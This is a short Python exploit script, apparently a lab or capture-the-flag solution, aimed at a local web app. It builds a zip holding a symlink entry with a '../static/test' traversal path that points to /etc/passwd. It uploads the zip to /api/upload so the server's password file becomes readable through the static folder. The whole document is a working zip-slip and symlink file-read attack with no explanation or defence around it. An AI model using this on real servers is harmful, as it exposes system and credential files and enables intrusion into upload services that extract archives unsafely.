import requests
import zipfile
import io
import time

target = "http://127.0.0.1:5000/"
payload = "hahahahahah"

fh = io.BytesIO()
with zipfile.ZipFile(fh, "a", zipfile.ZIP_DEFLATED, False) as zf:
    symlink_info = zipfile.ZipInfo("../static/test") # filename
    symlink_info.create_system = 3  # Indicates it's a symlink
    symlink_info.external_attr = 2716663808  # Specifies symlink permissions (octal: 0120000)
    symlink_target = "../../../../../../../../../etc/passwd"  # Set the symlink target
    zf.writestr(symlink_info, symlink_target)

r = requests.post(target + "/api/upload", files={"file": ("test.zip", fh.getvalue())})  # Passing the BytesIO object wrapped in a tuple
print(r.text)
